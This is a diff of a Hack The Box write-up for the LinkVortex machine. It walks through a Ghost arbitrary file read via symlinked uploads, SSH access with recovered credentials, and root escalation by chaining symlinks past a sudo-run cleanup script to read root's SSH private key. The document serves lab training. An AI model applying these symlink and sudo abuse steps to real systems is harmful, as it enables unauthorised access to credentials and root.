@@ -1,4 +1,4 @@
-Tags: 
+Tags: #Linux/Ubuntu #Easy #Apache #Hidden-Subdomains #Sensitive-Data-Exposure #Git #Arbitrary-File-Read #Source-Code-Analysis/Local-script #Symlinks
 # **Nmap Results**
 
 ```text
@@ -88,7 +88,10 @@ There is a password in the authentication.test.js file:
 I tried to login as admin with this, and it worked:
 
 ![[Pasted image 20250316191705.png]]
-
+<br>
+<br>
+# **Exploitation**
+## **Initial Access**
 Earlier, we found out that Ghost version 5.58 was in use, and when searching for known vulnerabilities, I came across an **Arbitrary File Read** vulnerability as detailed in [this GitHub page](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/tree/master)
 
 The vulnerability exists because Ghost does not perform any checks on uploaded content, automatically extracts ZIP files, and allows direct access to the directory where the uploaded content is stored. This allows an attacker to create a symlink (a file pointing to another file or directory), archive it, and upload it to the server. When Ghost unzips the file, it **preserves the symlink**, and once an attacker makes a request to this location, the server returns whatever resource it was pointing to. 
@@ -140,33 +143,81 @@ After lots of trial and error, I found Ghost's root directory to be in **/var/li
 }
 ```
 
-There seems to be something locally hosted on port 2368 and a mail server on port 587.  The credentials are provided at the bottom, which we can leverage later. Unfortunately this password isn't reused by node, so we have to keep digging. 
+There seems to be something locally hosted on port 2368 and a mail server on port 587.  The credentials are provided at the bottom, which we can leverage later. 
 
+Even though there was no user "bob" in the /etc/passwd file, he existed on the box and we were able to use those creds to login as him through SSH:
 
-<br>
-<br>
-# **Exploitation**
-## **Initial Access**
-Document here:
-* Exploit used (link to exploit)
-* Explain how the exploit works against the service
-* Any modified code (and why you modified it)
-* Proof of exploit (screenshot of reverse shell with target IP address output)
-
+![[Pasted image 20250330230413.png]]
 <br>
 <br>
 # **Privilege Escalation**  
+There is a directory "ghost" in **/opt** that contains an executable shell script called **clean_symlink.sh**:
 
-Document here:
-* Exploit used (link to exploit)
-* Explain how the exploit works 
-* Any modified code (and why you modified it)
-* Proof of privilege escalation (screenshot showing ip address and privileged username)
+![[Pasted image 20250330235503.png]]
+
+The output of `sudo -l` tells us we can execute it using sudo and assume root privileges:
+
+```
+Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT
+
+User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+```
+
+Here's the content of **clean_symlink.sh**:
+
+```bash
+#!/bin/bash
+
+QUAR_DIR="/var/quarantined"
+
+if [ -z $CHECK_CONTENT ];then
+  CHECK_CONTENT=false
+fi
+
+LINK=$1
+
+if ! [[ "$LINK" =~ \.png$ ]]; then
+  /usr/bin/echo "! First argument must be a png file !"
+  exit 2
+fi
+
+if /usr/bin/sudo /usr/bin/test -L $LINK;then
+  LINK_NAME=$(/usr/bin/basename $LINK)
+  LINK_TARGET=$(/usr/bin/readlink $LINK)
+  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
+    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
+    /usr/bin/unlink $LINK
+  else
+    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
+    /usr/bin/mv $LINK $QUAR_DIR/
+    if $CHECK_CONTENT;then
+      /usr/bin/echo "Content:"
+      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
+    fi
+  fi
+fi
+```
+
+Essentially, this script moves symlinks that are png files to **/var/quarantined**, unless it points to somewhere in **/etc** or **/root**. If it finds it points to those locations, it will delete it to prevent accessing sensitive info. There's also a CHECK_CONTENT variable, which will print the contents of the file pointed to by the symlink if set to "true". 
+
+We can leverage this script and escalate privileges by creating a chain of symlinks, as it will only check the first symlink and not any after that. This allows us to read any file on the system we want. Root's SSH private key might be worth grabbing, so our first symlink will point there. 
+
+To do this we run: `ln -s /root/.ssh/id_rsa id_rsa`. Then we want another symlink pointing to that file, so we'll run `ln -s $(pwd)/id_rsa test.png`. Remember the script only accepts png files. The "$(pwd)" bit is for giving test.png an absolute path to point to. 
+
+Lastly, we run `sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh *.png` in the directory where our 2 symlinks are, and we should get `Link found [ test.png ] , moving it to quarantine` and the contents of root's **id_rsa** file. 
+
+After saving it to your machine and assigning it the proper permissions, we can log in as root using their private key:
+
+![[Pasted image 20250331001924.png]]
 <br>
 <br>
 # Skills Learned
-Document here what you've learned after completing the box
+* If there's an exposed git repository (or .git directory), it's best to download all files and **reconstruct the repo** on your local machine. This allows you to use `git` commands to restore recently deleted files, view commit logs, etc. A useful tool to automate this is "git-dumper", available on GitHub. 
+* **Symlinks** can be dangerous if the server doesn't verify where they point to, as they can allow an attacker to **arbitrarily read files** they are normally restricted from seeing. 
+	* In the case of this machine, we used a script that created and uploaded a symlink that pointed to any file we specified in the command line. The server did not check this file at all. Later, we exploited a script to read the contents of root's private key by creating a chain of symlinks. The script only performed checks on the 1st symlink it saw and missed the 2nd one. 
 <br>
 <br>
 # Proof of Pwn
-Paste link to HTB Pwn notification after owning root
+https://www.hackthebox.com/achievement/machine/391579/638
